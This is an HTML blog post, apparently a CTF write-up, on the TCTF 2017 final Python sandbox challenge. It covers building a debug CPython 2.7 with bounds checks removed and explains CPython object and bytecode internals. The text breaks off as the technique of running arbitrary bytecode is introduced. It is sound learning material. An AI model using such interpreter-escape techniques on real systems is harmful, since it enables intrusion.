@@ -1,0 +1,818 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,python,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="TCTF 2017 final Python第一次接触cpython, 跟着大师傅们的步伐开始学习. 题目简介因为没打过, 所以以下都是来源于参考资料中师傅们的题目简介  python2.7“一个除了sys模块，连file object都用不了的Python2”  环境搭建123456git clone https://github.com/python/cpython.git -b 2.7cd">
+<meta name="keywords" content="pwn,python">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TCTF 2017 final Python">
+<meta property="og:url" content="http://yoursite.com/2019/10/01/TCTF_2017_final_Python/index.html">
+<meta property="og:site_name" content="Q4n&#39;s Blog">
+<meta property="og:description" content="TCTF 2017 final Python第一次接触cpython, 跟着大师傅们的步伐开始学习. 题目简介因为没打过, 所以以下都是来源于参考资料中师傅们的题目简介  python2.7“一个除了sys模块，连file object都用不了的Python2”  环境搭建123456git clone https://github.com/python/cpython.git -b 2.7cd">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-09-30T18:00:42.477Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="TCTF 2017 final Python">
+<meta name="twitter:description" content="TCTF 2017 final Python第一次接触cpython, 跟着大师傅们的步伐开始学习. 题目简介因为没打过, 所以以下都是来源于参考资料中师傅们的题目简介  python2.7“一个除了sys模块，连file object都用不了的Python2”  环境搭建123456git clone https://github.com/python/cpython.git -b 2.7cd">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/10/01/TCTF_2017_final_Python/">
+
+
+
+
+
+  <title>TCTF 2017 final Python | Q4n's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Q4n's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">一个Bin弟弟</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/01/TCTF_2017_final_Python/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Q4n">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Q4n's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">TCTF 2017 final Python</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-01T02:00:42+08:00">
+                2019-10-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="TCTF-2017-final-Python"><a href="#TCTF-2017-final-Python" class="headerlink" title="TCTF 2017 final Python"></a>TCTF 2017 final Python</h1><p>第一次接触cpython, 跟着大师傅们的步伐开始学习.</p>
+<h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p>因为没打过, 所以以下都是来源于参考资料中师傅们的题目简介</p>
+<blockquote>
+<p>python2.7<br>“一个除了sys模块，连file object都用不了的Python2”</p>
+</blockquote>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/python/cpython.git -b 2.7</span><br><span class="line"><span class="built_in">cd</span> cpython</span><br><span class="line">mkdir debug</span><br><span class="line"><span class="built_in">cd</span> debug</span><br><span class="line">../configure --with-pydebug</span><br><span class="line">make -j4</span><br></pre></td></tr></table></figure>
+
+<p>我的运行环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Python 2.7.16+ (heads/2.7-dirty:598f676, Sep 29 2019, 22:47:47) </span><br><span class="line">[GCC 5.4.0 20160609] on linux2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个环境复现最终失败了, 因为DEBUG下使用的是PyTuple_GetItem(), 有check</span></span><br><span class="line"><span class="comment"># Python/ceval.c:836</span></span><br><span class="line"><span class="comment">#ifndef Py_DEBUG  // 我们需要修改这个地方, 将ifndef 修改为ifdef</span></span><br><span class="line"><span class="comment">#define GETITEM(v, i) PyTuple_GET_ITEM((PyTupleObject *)(v), (i))</span></span><br><span class="line"><span class="comment">#else</span></span><br><span class="line"><span class="comment">#define GETITEM(v, i) PyTuple_GetItem((v), (i))</span></span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 还有这个地方, 也改为没有check的版本</span></span><br><span class="line"><span class="comment">#ifdef LLTRACE //这个地方的ifdef 改为ifndef</span></span><br><span class="line"><span class="comment">#define PUSH(v)         &#123; (void)(BASIC_PUSH(v), \</span></span><br><span class="line">                          lltrace &amp;&amp; prtrace(TOP(), <span class="string">"push"</span>)); \</span><br><span class="line">                          assert(STACK_LEVEL() &lt;= co-&gt;co_stacksize); &#125;</span><br><span class="line"><span class="comment">#define POP()           ((void)(lltrace &amp;&amp; prtrace(TOP(), "pop")), \</span></span><br><span class="line">                         BASIC_POP())</span><br><span class="line"><span class="comment">#define STACKADJ(n)     &#123; (void)(BASIC_STACKADJ(n), \</span></span><br><span class="line">                          lltrace &amp;&amp; prtrace(TOP(), <span class="string">"stackadj"</span>)); \</span><br><span class="line">                          assert(STACK_LEVEL() &lt;= co-&gt;co_stacksize); &#125;</span><br><span class="line"><span class="comment">#define EXT_POP(STACK_POINTER) ((void)(lltrace &amp;&amp; \</span></span><br><span class="line">                                prtrace((STACK_POINTER)[-1], <span class="string">"ext_pop"</span>)), \</span><br><span class="line">                                *--(STACK_POINTER))</span><br><span class="line"><span class="comment">#else</span></span><br><span class="line"><span class="comment">#define PUSH(v)                BASIC_PUSH(v)</span></span><br><span class="line"><span class="comment">#define POP()                  BASIC_POP()</span></span><br><span class="line"><span class="comment">#define STACKADJ(n)            BASIC_STACKADJ(n)</span></span><br><span class="line"><span class="comment">#define EXT_POP(STACK_POINTER) (*--(STACK_POINTER))</span></span><br><span class="line"><span class="comment">#endif</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Python-虚拟机原理"><a href="#Python-虚拟机原理" class="headerlink" title="Python 虚拟机原理"></a>Python 虚拟机原理</h2><p>Python虚拟机有个很明显的特点, 一切皆对象. (虽然代码是用c语言实现的)</p>
+<p>第一次见C用面向对象的思想, CPython中主要是用宏来进行定义. </p>
+<h4 id="PyObject对象"><a href="#PyObject对象" class="headerlink" title="PyObject对象"></a>PyObject对象</h4><p>这个是Python对对象的表示方式</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Include/object.h</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将活动的对象都链入一个双向链表</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _PyObject_HEAD_EXTRA            \</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">object</span> *_<span class="title">ob_next</span>;</span>           \</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">object</span> *_<span class="title">ob_prev</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个可以理解为所有objects的基类</span></span><br><span class="line"><span class="comment">/* PyObject_HEAD defines the initial segment of every PyObject. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PyObject_HEAD                   \</span></span><br><span class="line">    _PyObject_HEAD_EXTRA                \</span><br><span class="line">    Py_ssize_t ob_refcnt;               \</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">typeobject</span> *<span class="title">ob_type</span>;</span></span><br><span class="line">    <span class="comment">// ob_type一开始静态分配</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个是所有可变长度对象相关的类, 可以看到继承自PyObject_HEAD</span></span><br><span class="line"><span class="comment">// ob_size 是包含对象的个数, 也可以理解为一个引用计数, 用于GC</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PyObject_VAR_HEAD               \</span></span><br><span class="line">    PyObject_HEAD                       \</span><br><span class="line">    Py_ssize_t ob_size; <span class="comment">/* Number of items in variable part */</span></span><br><span class="line">   </span><br><span class="line"><span class="comment">// 可以看到, CPython用C模拟了面向对象的继承</span></span><br><span class="line"><span class="comment">/* Nothing is actually declared to be a PyObject, but every pointer to</span></span><br><span class="line"><span class="comment"> * a Python object can be cast to a PyObject*.  This is inheritance built</span></span><br><span class="line"><span class="comment"> * by hand.  Similarly every pointer to a variable-size Python object can,</span></span><br><span class="line"><span class="comment"> * in addition, be cast to PyVarObject*.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">object</span> &#123;</span></span><br><span class="line">    PyObject_HEAD</span><br><span class="line">&#125; PyObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PyObject_VAR_HEAD</span><br><span class="line">&#125; PyVarObject;</span><br></pre></td></tr></table></figure>
+
+<p>总结一下Python Object的特点:</p>
+<ul>
+<li>object有一个引用计数, 确保垃圾回收功能</li>
+<li>Object的类型是PyObject *</li>
+<li>Object 的内存和地址是保持不变的, 如果是变量的, 通过指向变量内存的指针实现</li>
+</ul>
+<h4 id="code对象"><a href="#code对象" class="headerlink" title="code对象"></a>code对象</h4><p>这个是Python对运行代码的表示, 比如说运行一个函数, 他会先用这个PyCodeObject生成一个对象, 然后运行的时候从中获取所需要的信息加以执行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Include/code.h</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bytecode object */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PyObject_HEAD</span><br><span class="line">    <span class="comment">// 除了args以外的参数</span></span><br><span class="line">    <span class="keyword">int</span> co_argcount;		<span class="comment">/* #arguments, except *args */</span></span><br><span class="line">    <span class="comment">// 局部变量</span></span><br><span class="line">    <span class="keyword">int</span> co_nlocals;		<span class="comment">/* #local variables */</span></span><br><span class="line">    <span class="keyword">int</span> co_stacksize;		<span class="comment">/* #entries needed for evaluation stack */</span></span><br><span class="line">    <span class="keyword">int</span> co_flags;		<span class="comment">/* CO_..., see below */</span></span><br><span class="line">    <span class="comment">// 这个地方是字节码</span></span><br><span class="line">    PyObject *co_code;		<span class="comment">/* instruction opcodes */</span></span><br><span class="line">    PyObject *co_consts;	<span class="comment">/* list (constants used) */</span></span><br><span class="line">    PyObject *co_names;		<span class="comment">/* list of strings (names used) */</span></span><br><span class="line">    PyObject *co_varnames;	<span class="comment">/* tuple of strings (local variable names) */</span></span><br><span class="line">    PyObject *co_freevars;	<span class="comment">/* tuple of strings (free variable names) */</span></span><br><span class="line">    PyObject *co_cellvars;      <span class="comment">/* tuple of strings (cell variable names) */</span></span><br><span class="line">    <span class="comment">/* The rest doesn't count for hash/cmp */</span></span><br><span class="line">    PyObject *co_filename;	<span class="comment">/* string (where it was loaded from) */</span></span><br><span class="line">    PyObject *co_name;		<span class="comment">/* string (name, for reference) */</span></span><br><span class="line">    <span class="keyword">int</span> co_firstlineno;		<span class="comment">/* first source line number */</span></span><br><span class="line">    PyObject *co_lnotab;	<span class="comment">/* string (encoding addr&lt;-&gt;lineno mapping) See</span></span><br><span class="line"><span class="comment">				   Objects/lnotab_notes.txt for details. */</span></span><br><span class="line">    <span class="keyword">void</span> *co_zombieframe;     <span class="comment">/* for optimization only (see frameobject.c) */</span></span><br><span class="line">    PyObject *co_weakreflist;   <span class="comment">/* to support weakrefs to code objects */</span></span><br><span class="line">&#125; PyCodeObject;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查类型</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PyCode_Check(op) (Py_TYPE(op) == &amp;PyCode_Type)</span></span><br><span class="line"><span class="comment">// Py_TYPE的定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Py_TYPE(ob)             (((PyObject*)(ob))-&gt;ob_type)</span></span><br></pre></td></tr></table></figure>
+
+<p>从中我们可以大概知道:</p>
+<ul>
+<li>一个PyCode对象的类型是通过检查PyObject_HEAD中的ob_type来确定的</li>
+<li>一个PyCode对象包含了运行一段代码, python所需要的信息, 其中比较重要的是字节码</li>
+</ul>
+<h4 id="PyTypeObject"><a href="#PyTypeObject" class="headerlink" title="PyTypeObject"></a>PyTypeObject</h4><p>这个对象是一个很特殊的对象, 其他的对象都是在堆上静态分配的, 但是这个对象不是的, 它是静态分配的.  作为标识对象的类型的一个对象, 可以看到在PyObject_HEAD中定义了一个指向他的指针ob_type</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">typeobject</span> &#123;</span></span><br><span class="line">    PyObject_VAR_HEAD</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *tp_name; <span class="comment">/* For printing, in format "&lt;module&gt;.&lt;name&gt;" */</span></span><br><span class="line">    Py_ssize_t tp_basicsize, tp_itemsize; <span class="comment">/* For allocation */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Methods to implement standard operations */</span></span><br><span class="line"></span><br><span class="line">    destructor tp_dealloc;</span><br><span class="line">    printfunc tp_print;</span><br><span class="line">    getattrfunc tp_getattr;</span><br><span class="line">    setattrfunc tp_setattr;</span><br><span class="line">    cmpfunc tp_compare;</span><br><span class="line">    reprfunc tp_repr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Method suites for standard classes */</span></span><br><span class="line"></span><br><span class="line">    PyNumberMethods *tp_as_number;</span><br><span class="line">    PySequenceMethods *tp_as_sequence;</span><br><span class="line">    PyMappingMethods *tp_as_mapping;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* More standard operations (here for binary compatibility) */</span></span><br><span class="line"></span><br><span class="line">    hashfunc tp_hash;</span><br><span class="line">    ternaryfunc tp_call;</span><br><span class="line">    reprfunc tp_str;</span><br><span class="line">    getattrofunc tp_getattro;</span><br><span class="line">    setattrofunc tp_setattro;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Functions to access object as input/output buffer */</span></span><br><span class="line">    PyBufferProcs *tp_as_buffer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Flags to define presence of optional/expanded features */</span></span><br><span class="line">    <span class="keyword">long</span> tp_flags;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *tp_doc; <span class="comment">/* Documentation string */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Assigned meaning in release 2.0 */</span></span><br><span class="line">    <span class="comment">/* call function for all accessible objects */</span></span><br><span class="line">    traverseproc tp_traverse;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* delete references to contained objects */</span></span><br><span class="line">    inquiry tp_clear;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Assigned meaning in release 2.1 */</span></span><br><span class="line">    <span class="comment">/* rich comparisons */</span></span><br><span class="line">    richcmpfunc tp_richcompare;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* weak reference enabler */</span></span><br><span class="line">    Py_ssize_t tp_weaklistoffset;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Added in release 2.2 */</span></span><br><span class="line">    <span class="comment">/* Iterators */</span></span><br><span class="line">    getiterfunc tp_iter;</span><br><span class="line">    iternextfunc tp_iternext;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Attribute descriptor and subclassing stuff */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">PyMethodDef</span> *<span class="title">tp_methods</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">PyMemberDef</span> *<span class="title">tp_members</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">PyGetSetDef</span> *<span class="title">tp_getset</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">typeobject</span> *<span class="title">tp_base</span>;</span></span><br><span class="line">    PyObject *tp_dict;</span><br><span class="line">    descrgetfunc tp_descr_get;</span><br><span class="line">    descrsetfunc tp_descr_set;</span><br><span class="line">    Py_ssize_t tp_dictoffset;</span><br><span class="line">    initproc tp_init;</span><br><span class="line">    allocfunc tp_alloc;</span><br><span class="line">    newfunc tp_new;</span><br><span class="line">    freefunc tp_free; <span class="comment">/* Low-level free-memory routine */</span></span><br><span class="line">    inquiry tp_is_gc; <span class="comment">/* For PyObject_IS_GC */</span></span><br><span class="line">    PyObject *tp_bases;</span><br><span class="line">    PyObject *tp_mro; <span class="comment">/* method resolution order */</span></span><br><span class="line">    PyObject *tp_cache;</span><br><span class="line">    PyObject *tp_subclasses;</span><br><span class="line">    PyObject *tp_weaklist;</span><br><span class="line">    destructor tp_del;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Type attribute cache version tag. Added in version 2.6 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_version_tag;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> COUNT_ALLOCS</span></span><br><span class="line">    <span class="comment">/* these must be last and never explicitly initialized */</span></span><br><span class="line">    Py_ssize_t tp_allocs;</span><br><span class="line">    Py_ssize_t tp_frees;</span><br><span class="line">    Py_ssize_t tp_maxalloc;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">typeobject</span> *<span class="title">tp_prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">typeobject</span> *<span class="title">tp_next</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; PyTypeObject;</span><br></pre></td></tr></table></figure>
+
+<h4 id="运行原理"><a href="#运行原理" class="headerlink" title="运行原理"></a>运行原理</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Python/ceval.c</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>在其中的<code>PyEval_EvalFrameEx</code>函数是执行虚拟机指令的代码, 之后的获取虚拟机的opcode之类的操作全部都是由宏实现…</p>
+<p>说一些题外话</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GETLOCAL(i)     (fastlocals[i])</span></span><br><span class="line">...</span><br><span class="line">    <span class="keyword">register</span> PyObject **fastlocals, **freevars;</span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BASIC_PUSH(v)     (*stack_pointer++ = (v))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BASIC_POP()       (*--stack_pointer)</span></span><br></pre></td></tr></table></figure>
+
+<p>从他的push和pop的宏可以看出, 他的sp指针一般指向栈顶的一个空闲位置, 而且他的栈中存储的是PyObject对象</p>
+<h2 id="进入正题"><a href="#进入正题" class="headerlink" title="进入正题"></a>进入正题</h2><h4 id="运行任意字节码"><a href="#运行任意字节码" class="headerlink" title="运行任意字节码"></a>运行任意字节码</h4><p>Python的运行时首先compile得到PyCodeObject, PyCodeObject里面的字节码决定了执行什么样的字节码, 如果我们能控制这个字节码, 就可以执行我们想要的字节码了</p>
+<p>想要操作这个字节码很简单, 使用types库就可以</p>
+<h5 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h5><h6 id="Python字节码-个人理解"><a href="#Python字节码-个人理解" class="headerlink" title="Python字节码(个人理解)"></a>Python字节码(个人理解)</h6><p>我们可以使用dis.dis(bytesource)来反汇编bytesource对象, bytesource可以表示模块, 类, 方法, 函数或者代码对象</p>
+<p>因为原来只是在某道misc中粗略的接触过一点点python的bytecode, 所以这里我也详细记录一下.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">p</span><span class="params">(a,b)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> a+b</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dis.dis(p)</span><br><span class="line">  <span class="number">2</span>           <span class="number">0</span> LOAD_FAST                <span class="number">0</span> (a)</span><br><span class="line">              <span class="number">3</span> LOAD_FAST                <span class="number">1</span> (b)</span><br><span class="line">              <span class="number">6</span> BINARY_ADD, 